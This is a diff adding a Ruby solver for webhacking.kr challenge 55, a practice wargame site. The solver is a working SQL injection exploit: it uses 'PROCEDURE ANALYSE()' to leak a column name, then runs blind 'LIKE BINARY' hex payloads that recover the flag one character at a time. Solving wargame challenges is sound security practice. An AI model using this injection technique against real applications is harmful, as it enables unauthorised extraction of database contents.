@@ -1330,6 +1330,98 @@ module WebhackingKR
   end
 
   ##
+  # Challenge 55
+  class Challenge55 < ChallengeBase
+    CHALLENGE = 55
+
+    PATH = '/challenge/web-31/'
+    PATH_RANK = "#{PATH}rank.php"
+    PARAM_SCORE = 'score'
+    PARAM_MX = 'mx'
+    PARAM_MY = 'my'
+    RANDOM_MAX = (2**32) / 2
+    PAYLOAD = '$SCORE$ AND $COLUMN$ LIKE BINARY 0x$HEX$'
+    PAYLOAD_COLUMN = '$SCORE$ LIMIT $OFFSET$, 1 PROCEDURE ANALYSE()'
+    COLUMNS_EXCLUDE = %w[id score].freeze
+    ALPHABET = ('!'..'~').to_a
+
+    def exec
+      score = SecureRandom.rand(RANDOM_MAX)
+      mx = SecureRandom.rand(RANDOM_MAX)
+      my = SecureRandom.rand(RANDOM_MAX)
+      log("Sending score: #{score}")
+      post(
+        PATH,
+        {
+          PARAM_SCORE => score,
+          PARAM_MX => mx,
+          PARAM_MY => my
+        }
+      )
+
+      log('Searching a column name')
+      column = nil
+      http_start do
+        offset = 0
+        loop do
+          payload = PAYLOAD_COLUMN.sub('$SCORE$', score.to_s)
+          payload = payload.sub('$OFFSET$', offset.to_s)
+          query = URI.encode_www_form(
+            PARAM_SCORE => payload
+          )
+          response = get("#{PATH_RANK}?#{query}")
+          if response.body =~ %r{id : webhacking\.chall55\.(\w+) //} && !COLUMNS_EXCLUDE.include?(Regexp.last_match(1))
+            column = Regexp.last_match(1)
+            break
+          end
+          offset += 1
+        end
+      end
+
+      unless column
+        failed('Column not found')
+        return
+      end
+
+      log("Column found: #{column}")
+      log('Searching a flag')
+      flag = String.new
+      search = true
+      http_start do
+        while search
+          ALPHABET.each.with_index do |char, i|
+            c = char.dup
+            c.prepend('\\') if ['_', '%', '\\'].include?(c)
+            f = "#{flag}#{c}%"
+            payload = PAYLOAD.sub('$SCORE$', score.to_s)
+            payload = payload.sub('$COLUMN$', column)
+            payload = payload.sub('$HEX$', f.unpack1('H*'))
+            query = URI.encode_www_form(
+              PARAM_SCORE => payload
+            )
+            response = get("#{PATH_RANK}?#{query}")
+            if response.body =~ %r{// #{score}</center>}
+              flag << char
+              log(flag)
+              break
+            end
+
+            search = i != ALPHABET.length - 1
+          end
+        end
+      end
+
+      if flag.empty?
+        failed('Flag not found')
+        return
+      end
+
+      log("Flag found: #{flag}")
+      check(auth(flag))
+    end
+  end
+
+  ##
   # Challenge 58
   class Challenge58 < ChallengeBase
     CHALLENGE = 58
